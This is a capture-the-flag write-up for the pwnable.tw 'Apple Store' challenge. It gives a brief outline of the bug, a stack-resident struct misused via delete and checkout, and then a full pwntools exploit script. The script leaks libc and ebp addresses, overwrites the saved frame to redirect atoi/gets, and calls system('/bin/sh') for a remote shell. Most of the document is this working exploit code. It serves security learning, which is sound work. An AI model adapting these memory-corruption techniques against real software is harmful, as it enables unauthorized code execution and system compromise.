# Aplle Store
> LongChampion, 26/03/2020

## Ideal
- First, we need to buy an Iphone 8 with $1 by spending exactly $7174 to buy other products.
- The struct which saves info about our Iphone 8 is on stack !!! (not in heap).
- Use GDB to analyze the offset.
- Then use `delete` procedure to control content of Iphone 8 struct and use `checkout` to leak infomation (`libc_base` and  `ebp`)
- Repeat the above step to overwrite `ebp` with `atoi_got+0x22`
- Now, when we enter `delete`, `choice` variable is located at `atoi_got` (because address of `choice` is `delete_ebp-0x22`)
- Change `atoi_got` to `system_addr` and get the shell 

## Final Solution
```python
#!/usr/bin/env python2

from pwn import *

read_got = 0x0804b00c

r = remote("chall.pwnable.tw", 10104)
K = LIBC = ELF("./libc_32.so.6")


def Buy(p, idx):
    p.sendlineafter(">", "2")
    p.sendlineafter("Device Number>", str(idx))


def Checkout(p):
    p.sendlineafter(">", "5")
    p.sendlineafter("Let me check your cart. ok? (y/n) >", "y")


def BuyIphone8(p):
    for _ in range(10):
        Buy(p, 4)
    for _ in range(16):
        Buy(p, 5)
    Checkout(p)


def LeakLIBC(p):
    p.sendlineafter(">", "3")
    p.sendlineafter("Item Number>", "27" + p32(read_got) + "\x00" * 12)
    p.recvuntil("27:")
    read_addr = u32(p.recv(4))
    return read_addr - LIBC.symbols["read"]


def LeakEBP(p):
    p.sendlineafter(">", "3")
    environ = LIBC_BASE + LIBC.symbols["environ"]
    p.sendlineafter("Item Number>", "27" + p32(environ) + "\x00" * 12)
    p.recvuntil("27:")
    environ_addr = u32(p.recv(4))
    return environ_addr - 0x104


BuyIphone8(r)
LIBC_BASE = LeakLIBC(r)
gets_addr = LIBC_BASE + LIBC.symbols["gets"]
system_addr = LIBC_BASE + LIBC.symbols["system"]
binsh_addr = LIBC_BASE + LIBC.search("/bin/sh\x00").next()

EBP = LeakEBP(r)

r.sendlineafter(">", "3")
r.sendlineafter("Item Number>", "27" + p32(gets_addr) +
                "4444" + p32(EBP + 0x20) + p32(EBP - 0x8))

r.sendline("666666" + p32(system_addr) + p32(EBP + 0x20) + p32(binsh_addr))

r.interactive()
```
